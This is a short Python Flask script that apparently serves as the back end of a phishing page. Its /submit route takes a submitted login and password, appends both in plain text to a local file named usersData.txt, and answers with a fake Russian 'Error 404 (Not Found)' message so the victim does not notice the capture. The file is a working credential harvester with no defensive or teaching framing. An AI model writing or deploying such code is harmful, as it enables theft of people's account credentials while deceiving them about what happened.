from flask import Flask, request

app = Flask(__name__)


@app.route('/submit', methods=['POST'])
def submit():
    login = request.form['login']
    password = request.form['password']

    data = f"login: {login}, password: {password}\n"
    
    with open('usersData.txt', 'a') as file:
        file.write(data)

    return "Ошибка 404 (Not Found)"

if __name__ == '__main__':
    app.run(debug=True)